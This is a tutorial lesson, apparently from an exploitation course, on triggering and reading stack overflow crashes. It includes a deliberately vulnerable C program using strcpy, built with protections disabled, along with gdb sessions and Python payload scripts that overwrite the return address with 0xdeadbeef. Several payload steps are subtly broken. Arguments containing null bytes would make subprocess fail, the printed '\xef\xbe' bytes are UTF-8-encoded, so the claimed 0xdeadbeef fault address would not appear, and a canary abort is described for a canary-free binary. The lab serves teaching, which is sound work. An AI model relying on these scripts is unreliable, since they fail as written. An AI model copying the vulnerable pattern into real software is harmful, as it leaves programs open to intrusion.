Triggering and Observing a Crash

Summary

A crash is data. Before you can control where a program goes, you need to reliably make it fail,
and you need to read exactly how. This is the observation half of exploitation.

Key ideas

  • A segfault is the kernel refusing a memory access; the address tells you what you touched
  • Overwriting the return address with 0xdeadbeef crashes at ret, not at the copy
  • The crash location tells you which pointer you corrupted
  • dmesg reports the faulting address and the instruction pointer
  • GDB catches the signal before the process dies, so you can walk the stack
  • Reproducibility matters: same input, same crash, every time

Terminology

Term Meaning
Segmentation fault (SIGSEGV) Invalid memory access
SIGABRT abort() called — usually a canary failure
RIP Instruction pointer at the fault
Faulting address The address that was invalid
Core dump Post-mortem memory snapshot
ret instruction Where a corrupted return address finally takes effect
Wild pointer A pointer to unmapped memory
Dmesg Kernel ring buffer; logs the segfault reason
Deterministic crash Same input always produces the same fault

Kali commands

# --- trigger it from the shell ---
./target "$(python3 -c 'print("A"*64)')" ; echo "exit: $?"
dmesg | tail -5

# --- core dumps ---
ulimit -c unlimited
cat /proc/sys/kernel/core_pattern
ls -la core* 2>/dev/null | head

# --- catch the signal in gdb ---
gdb -q --batch \
  -ex 'run' \
  -ex 'bt' \
  -ex 'info registers rip rsp rbp' \
  -ex 'x/i $rip' \
  -ex 'x/8gx $rsp' \
  ./target "$(python3 -c 'print("A"*64)')" 2>&1 | tail -25

# --- break at ret to see the moment of the jump ---
objdump -d ./target | grep -B2 "ret"
# then:  gdb -ex 'break *0x4011ce' -ex run -ex 'p/x $rsp' -ex 'x/4gx $rsp'

# --- signals reference ---
kill -l | head -12
python3 -c "import signal; print('SIGSEGV', int(signal.SIGSEGV), 'SIGABRT', int(signal.SIGABRT))"

Field lab

Objective: produce crashes with distinct signatures and identify each one from evidence.

mkdir -p ~/aegis/labs/ex-03 && cd ~/aegis/labs/ex-03

cat > target.c <<'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win(void) { puts("WIN: you redirected execution"); exit(0); }

void vuln(const char *input) {
    char buf[32];
    strcpy(buf, input);              /* unbounded copy */
    printf("copied %zu bytes\n", strlen(buf));
}

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <string> [win]\n", argv[0]); return 1; }
    vuln(argv[1]);
    printf("returned normally\n");
    return 0;
}
EOF
gcc -Wall -g -O0 -fno-stack-protector -no-pie -z execstack target.c -o target
checksec --file=./target | grep -E "canary|NX|PIE"
objdump -d ./target | grep -E "<win>|<vuln>|<main>:" | head

# --- 1. no overflow: clean run ---
echo "=== short input ==="
./target "hello"; echo "  exit: $?"
echo "  ^ 'returned normally' means the frame was intact"

# --- 2. exactly at the boundary ---
echo
echo "=== boundary probing ==="
for n in 16 24 31 32 33 40 48 56 64 80; do
  out=$(./target "$(python3 -c "print('A'*$n)")" 2>&1); rc=$?
  printf "  n=%-4s rc=%-4s %s\n" "$n" "$rc" "$(echo "$out" | tail -1 | cut -c1-46)"
done

# --- 3. the kernel's version of the same event ---
echo
echo "=== what the kernel recorded ==="
sudo dmesg -T 2>/dev/null | grep -iE "segfault|general protection|trap" | tail -5 \
  || dmesg | grep -i segfault | tail -5

# --- 4. crash under gdb, caught before death ---
echo
echo "=== catching the fault in gdb ==="
gdb -q --batch \
  -ex 'run' \
  -ex 'echo \n=== signal caught ===\n' \
  -ex 'bt' \
  -ex 'info registers rip rsp rbp rdi rsi' \
  -ex 'x/i $rip' \
  -ex 'x/4gx $rbp' \
  -ex quit \
  --args ./target "$(python3 -c 'print("B"*48)')" 2>&1 | tail -30 | tee 01-gdb-crash.txt
cat 01-gdb-crash.txt
echo
echo "Read: RIP is where it died. If RIP looks like 0x00000000deadbeef or"
echo "0x4141414141414141, the return address is what you corrupted."

# --- 5. control the corrupted return address exactly ---
echo
echo "=== putting a known value in the return slot ==="
python3 - <<'PY'
import subprocess, struct
ADDR = 0xdeadbeef
for pad in range(1, 80):
    payload = b"A" * pad + struct.pack("<Q", ADDR)
    r = subprocess.run(["./target", payload], capture_output=True, timeout=5)
    if r.returncode != 0:
        print(f"  padding {pad:>3}  exit={r.returncode}  (SIGSEGV={r.returncode < 0 and -r.returncode or 139})")
        break
PY

# --- 6. prove the fault address is OUR value ---
echo
echo "=== the faulting address in dmesg should be 0xdeadbeef ==="
./target "$(python3 -c 'print("A"*40 + "\xef\xbe\xad\xde\x00\x00\x00\x00")')" 2>/dev/null
sudo dmesg -T 2>/dev/null | tail -3

# --- 7. distinguish SIGSEGV from SIGABRT ---
echo
echo "=== two different failure signatures ==="
python3 - <<'PY'
import subprocess, struct
# a canary failure calls abort() -> SIGABRT (134); a bad return -> SIGSEGV (139)
for name, payload in [
    ("short input          ", b"A"*8),
    ("long input, no canary", b"A"*200),
    ("wild return address  ", b"A"*40 + struct.pack("<Q", 0xdeadbeef)),
]:
    r = subprocess.run(["./target", payload], capture_output=True, timeout=5)
    sig = -r.returncode if r.returncode < 0 else None
    print(f"  {name}  exit={r.returncode:<4} signal={sig}  {r.stderr.decode()[:44]}")
PY

# --- 8. break exactly at ret ---
echo
echo "=== the moment of the jump ==="
RETADDR=$(objdump -d ./target | awk '/<main>:/,/^$/' | grep -B1 "ret" | grep -oE "0x[0-9a-f]+" | head -1)
echo "  a ret instruction is at approximately: $RETADDR"
gdb -q --batch \
  -ex "break *${RETADDR:-0x0}" \
  -ex "run $(python3 -c 'print("C"*40)')" \
  -ex 'echo \n-- at the ret instruction --\n' \
  -ex 'x/1gx $rsp' \
  -ex 'x/i $rip' \
  -ex quit ./target 2>&1 | tail -12 | tee 02-at-ret.txt

# --- 9. record the observations ---
cat > 03-observations.md <<'EOF'
# Crash observations (target, gcc -O0 -fno-stack-protector)

| Input length | Exit | Signal | RIP looks like | Interpretation |
|---|---|---|---|---|
|   |  |  |  |  |
|   |  |  |  |  |
|   |  |  |  |  |
|   |  |  |  |  |

## What to remember
- The crash happens at `ret`, not at the copy. The copy silently succeeds.
- SIGSEGV (139) = invalid address. SIGABRT (134) = a check failed (canary).
- The faulting address in dmesg equals whatever you wrote into the return slot.
EOF
cat 03-observations.md

Step 7 is the insight to carry forward. A SIGSEGV from a wild address and a SIGABRT from a
canary failure look completely different, and telling them apart instantly tells you which
mitigation you are fighting.

Self-test

  1. At which instruction does a stack overflow crash: the copy, or the return?
  2. How do you tell a SIGSEGV caused by a corrupted return address from a canary abort?
  3. What is the significance of the faulting address in dmesg?
  4. Why does gdb see the crash when the shell only sees an exit code?
  5. What does RIP look like if the return address was overwritten with 0x41414141?
